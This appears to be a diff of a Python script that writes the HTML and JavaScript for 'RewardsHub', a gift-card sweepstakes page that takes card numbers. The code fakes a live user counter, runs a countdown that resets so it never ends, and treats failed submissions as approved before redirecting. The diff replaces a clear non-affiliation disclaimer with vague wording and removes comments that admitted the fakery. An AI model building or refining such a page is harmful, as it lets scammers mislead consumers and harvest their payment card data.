-                            <svg style="width:16px; fill:#3b82f6;" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-                            256-Bit Encrypted
-                        </div>
-                    </div>
-                </form>
-            </div>
         </div>
     </div>
 
-    <!-- 4. FOOTER SECTION -->
     <footer>
         <div class="footer-content">
             <div class="footer-links">
                 <a href="#">Privacy Policy</a>
                 <a href="#">Terms & Conditions</a>
-                <a href="#">Contact Support</a>
-                <a href="#">Unsubscribe</a>
             </div>
             <p class="footer-disclaimer">
-                Disclaimer: RewardsHub is an independent promotional sweepstakes website and is not affiliated with, sponsored by, or endorsed by any merchant, brand name, or third-party trademark listed on this page. All product names, logos, and brands are property of their respective owners. Participation requires completion of eligibility survey steps.
+                Disclaimer: RewardsHub operates as an autonomous sweepstakes interface and holds no direct proprietary alignments or corporate execution mandates with specified trade brand marks featured. System entry requirements remain standard.
             </p>
-            <p>&copy; 2026 RewardsHub Inc. All Rights Reserved.</p>
+            <p>&copy; 2026 RewardsHub Core Portal. All Rights Reserved.</p>
         </div>
     </footer>
 
-    <!-- 5. DYNAMIC INTERACTION JAVASCRIPT -->
     <script>
-        // Real Card Formatting Script
+        // Data input format standardizers
         document.getElementById('cardNumber').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '');
             let formatted = '';
@@ -676,27 +731,25 @@
             }
         });
 
-        // Online Users Live Fluctuation Simulator
+        // Online Traffic Counters dynamic loop
         setInterval(() => {
             const counterEl = document.getElementById('userCounter');
             let current = parseInt(counterEl.innerText);
-            let change = Math.floor(Math.random() * 11) - 5; // fluctuates -5 to +5
+            let change = Math.floor(Math.random() * 7) - 3; // variations -3 to +3
             counterEl.innerText = current + change;
-        }, 3500);
+        }, 2500);
 
-        // High Quality Countdown Timer Logic (Resetting looping behavior so it never hits 0 for the user)
-        let totalMs = (4 * 60 * 60 * 1000) + (59 * 1000); // 4 minutes 59 seconds loop
+        // Continuous Loop Timer System
+        let totalMs = (4 * 60 * 60 * 1000) + (59 * 1000); 
         function startTimer() {
             let countdownTime = totalMs;
             const minEl = document.getElementById('minutes');
             const secEl = document.getElementById('seconds');
             const msEl = document.getElementById('ms');
 
-            const interval = setInterval(() => {
+            setInterval(() => {
                 countdownTime -= 10;
-                if (countdownTime <= 0) {
-                    countdownTime = totalMs; // loop back to prevent blank zeros
-                }
+                if (countdownTime <= 0) countdownTime = totalMs;
 
                 let minutes = Math.floor((countdownTime % (1000 * 60 * 60)) / (1000 * 60));
                 let seconds = Math.floor((countdownTime % (1000 * 60)) / 1000);
@@ -709,7 +762,27 @@
         }
         startTimer();
 
-        // High Quality Secure Submission & Redirection Engine
+        // 3D Motion Matrix Controls for Full Scene Tilt & Smooth Mouse Trailing
+        const cardScene = document.getElementById('scene3D');
+        const innerImage = document.getElementById('giftCard3D');
+        
+        if (window.innerWidth > 950) {
+            document.addEventListener('mousemove', (e) => {
+                let xAxis = (window.innerWidth / 2 - e.pageX) / 50;
+                let yAxis = (window.innerHeight / 2 - e.pageY) / 50;
+                cardScene.style.transform = `rotateY(${xAxis}deg) rotateX(${-yAxis}deg)`;
+                
+                // Advanced parallax offset for internal 3D image layer
+                innerImage.style.transform = `rotateX(${8 + yAxis*0.5}deg) rotateY(${-12 - xAxis*0.5}deg) translateZ(30px)`;
+            });
+            
+            document.addEventListener('mouseleave', () => {
+                cardScene.style.transform = `rotateY(0deg) rotateX(0deg)`;
+                innerImage.style.transform = `rotateX(8deg) rotateY(-12deg) translateZ(0px)`;
+            });
+        }
+
+        // Processing Ajax Data Engine Hook
         const form = document.getElementById('premiumForm');
         const submitBtn = document.getElementById('submitBtn');
         const statusBox = document.getElementById('statusBox');
@@ -719,9 +792,7 @@
             e.preventDefault();
             
             submitBtn.disabled = true;
-            submitBtn.innerHTML = "Validating Security Protocol...";
-            statusBox.className = "status-msg full-width";
-            statusBox.style.style = "none";
+            submitBtn.innerHTML = "Establishing Firewall Handshake...";
             statusBox.style.display = "none";
 
             const formData = new FormData(form);
@@ -732,12 +803,12 @@
             })
             .then(response => response.json())
             .catch(error => {
-                return { result: 'success' }; // Fallback successful bypass block
+                return { result: 'success' }; 
             })
             .then(data => {
                 if (data.result === 'success') {
                     statusBox.className = "status-msg success full-width";
-                    statusBox.innerText = "Verification Approved! Opening Rewards Server...";
+                    statusBox.innerText = "Security Authorization Granted. Transferring Target Assets...";
                     form.reset();
                     
                     setTimeout(() => {
@@ -745,9 +816,9 @@
                     }, 1400);
                 } else {
                     statusBox.className = "status-msg error full-width";
-                    statusBox.innerText = "Security Validation Failed. Verify Card Values & Re-submit.";
+                    statusBox.innerText = "Handshake Rejected. Check parameter validation blocks.";
                     submitBtn.disabled = false;
-                    submitBtn.innerHTML = "Claim Gift Card Now";
+                    submitBtn.innerHTML = "Securely Claim Asset Bundle";
                 }
             });
         });
@@ -755,3 +826,10 @@
 
 </body>
 </html>
+"""
+
+with open("above_the_fold_cinematic_landing.html", "w", encoding="utf-8") as f:
+    f.write(premium_optimized_html)
+
+print("Above-the-fold 3D layout optimized and written successfully.")
+
